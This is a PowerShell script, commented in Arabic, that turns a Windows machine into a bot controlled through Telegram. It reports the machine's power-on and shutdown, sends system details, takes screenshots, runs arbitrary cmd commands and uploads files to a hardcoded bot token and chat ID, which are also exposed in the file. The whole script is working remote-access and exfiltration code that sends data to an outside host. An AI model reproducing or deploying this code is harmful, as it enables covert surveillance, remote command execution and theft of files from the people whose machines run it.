
# ========== إعدادات التكوين ==========
$config = @{
    TelegramToken = "7993044710:AAEdKGGcUnV093cRtdQQiNqTGuiETgl-658"
    ChatID = "8085876352"
    MaxRetries = 3
    CommandCooldown = 2
    MaxErrorsBeforeExit = 5
    BlockedPaths = @(
        "$env:WINDIR\System32",
        "$env:ProgramData",
        "$env:USERPROFILE\AppData"
    )
}

# ========== وظائف المساعدة ==========
function Send-Telegram {
    param(
        [string]$Message,
        [string]$FilePath = $null
    )
    
    $retryCount = 0
    while ($retryCount -lt $config.MaxRetries) {
        try {
            if ($FilePath -and (Test-Path $FilePath)) {
                $response = Invoke-RestMethod -Uri "$($apiURL)/sendDocument" -Method Post -Form @{
                    chat_id = $config.ChatID
                    document = Get-Item $FilePath
                }
            } else {
                $response = Invoke-RestMethod -Uri "$($apiURL)/sendMessage" -Method POST -Body @{
                    chat_id = $config.ChatID
                    text = $Message
                }
            }
            return $response
        } catch {
            $retryCount++
            Write-Warning "فشل إرسال الرسالة (المحاولة $retryCount): $_"
            Start-Sleep -Seconds ([math]::Pow(2, $retryCount))
        }
    }
    Write-Error "فشل إرسال الرسالة بعد $($config.MaxRetries) محاولات"
}

function Get-SystemInfo {
    try {
        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption
        $cpu = (Get-CimInstance Win32_Processor -ErrorAction Stop).Name
        $ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory / 1GB) + " GB"
        
        return @"
🖥️ معلومات النظام:
• نظام التشغيل: $os
• المعالج: $cpu
• الذاكرة RAM: $ram
• اسم الجهاز: $($env:COMPUTERNAME)
• المستخدم: $($env:USERNAME)
• الوقت: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
"@
    } catch {
        Write-Warning "فشل جمع معلومات النظام: $_"
        return "❌ فشل جمع معلومات النظام"
    }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        
        $g.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bmp.Size)
        
        $path = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMddHHmmss').png"
        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        
        return $path
    } catch {
        Write-Warning "فشل التقاط لقطة الشاشة: $_"
        return $null
    } finally {
        if ($g) { $g.Dispose() }
        if ($bmp) { $bmp.Dispose() }
    }
}

function Execute-Command {
    param(
        [string]$Command
    )
    
    try {
        $output = (cmd /c $Command 2>&1) | Out-String
        
        if ($output.Length -gt 4000) {
            $output = $output.Substring(0, 4000) + "... (تم اقتطاع الناتج)"
        }
        
        return $output
    } catch {
        Write-Warning "فشل تنفيذ الأمر: $_"
        return "❌ فشل تنفيذ الأمر: $_"
    }
}

# ========== إعدادات التشغيل ==========
$apiURL = "https://api.telegram.org/bot$($config.TelegramToken)"

# إرسال إشعار التشغيل
Send-Telegram -Message "🟢 [$($env:COMPUTERNAME)] تم تشغيل الجهاز`n👤 المستخدم: $($env:USERNAME)`n🕒 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# تسجيل حدث الإطفاء
Register-EngineEvent PowerShell.Exiting -Action {
    try {
        $msg = "🔴 [$($env:COMPUTERNAME)] تم إطفاء الجهاز أو تسجيل الخروج`n👤 المستخدم: $($env:USERNAME)`n🕒 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        if (Test-Connection -ComputerName "api.telegram.org" -Count 1 -Quiet) {
            Invoke-RestMethod -Uri "$using:apiURL/sendMessage" -Method POST -Body @{
                chat_id = $using:config.ChatID
                text = $msg
            } | Out-Null
        }
    } catch {
        Write-Warning "فشل إرسال رسالة الإغلاق: $_"
    }
} | Out-Null

# ========== حلقة الأوامر الرئيسية ==========
function Start-CommandListener {
    $offset = 0
    $errorCount = 0
    
    while ($true) {
        try {
            $updates = Invoke-RestMethod -Uri "$apiURL/getUpdates?offset=$offset&timeout=10" -ErrorAction Stop
            $errorCount = 0
            
            foreach ($update in $updates.result) {
                $offset = $update.update_id + 1
                
                # التحقق من هوية المرسل
                if ($update.message.chat.id -ne $config.ChatID) {
                    continue
                }
                
                $text = $update.message.text
                $command = $text -split '\s+' | Select-Object -First 1
                $arguments = $text.Substring($command.Length).Trim()
                
                switch ($command) {
                    "/info" {
                        Send-Telegram -Message (Get-SystemInfo)
                    }
                    
                    "/screenshot" {
                        $screenshotPath = Take-Screenshot
                        if ($screenshotPath) {
                            Send-Telegram -Message "📸 تم التقاط لقطة الشاشة" -FilePath $screenshotPath
                            Remove-Item $screenshotPath -Force
                        } else {
                            Send-Telegram -Message "❌ فشل التقاط لقطة الشاشة"
                        }
                    }
                    
                    "/cmd" {
                        if (-not [string]::IsNullOrEmpty($arguments)) {
                            $output = Execute-Command -Command $arguments
                            Send-Telegram -Message "📟 نتيجة الأمر:`n$output"
                        } else {
                            Send-Telegram -Message "⚠️ يرجى تحديد الأمر المطلوب تنفيذه"
                        }
                    }
                    
                    "/download" {
                        if (-not [string]::IsNullOrEmpty($arguments)) {
                            $filePath = $arguments
                            
                            if (-not (Test-Path $filePath)) {
                                Send-Telegram -Message "❌ الملف غير موجود: $filePath"
                                continue
                            }
                            
                            $isBlocked = $false
                            foreach ($blockedPath in $config.BlockedPaths) {
                                if ($filePath -like "$blockedPath*") {
                                    $isBlocked = $true
                                    break
                                }
                            }
                            
                            if ($isBlocked) {
                                Send-Telegram -Message "⛔ غير مسموح بتنزيل ملفات من هذا المسار"
                            } else {
                                Send-Telegram -Message "⬇️ جاري تنزيل الملف..." -FilePath $filePath
                            }
                        } else {
                            Send-Telegram -Message "⚠️ يرجى تحديد مسار الملف"
                        }
                    }
                    
                    "/exit" {
                        Send-Telegram -Message "🔚 جاري إيقاف البرنامج..."
                        exit 0
                    }
                    
                    default {
                        Send-Telegram -Message "⚠️ أمر غير معروف: $command`n`nالأوامر المتاحة:`n/info - معلومات النظام`n/screenshot - لقطة الشاشة`n/cmd [أمر] - تنفيذ أمر CMD`n/download [مسار] - تنزيل ملف`n/exit - إيقاف البرنامج"
                    }
                }
                
                Start-Sleep -Milliseconds 500
            }
        } catch {
            $errorCount++
            Write-Warning "خطأ في الاتصال بالتليجرام (المحاولة $errorCount): $_"
            
            if ($errorCount -ge $config.MaxErrorsBeforeExit) {
                Send-Telegram -Message "❌ تم إيقاف البرنامج بسبب أخطاء متكررة"
                exit 1
            }
            
            Start-Sleep -Seconds ([math]::Pow(2, $errorCount))
        }
    }
}

# بدء الاستماع للأوامر
Start-CommandListener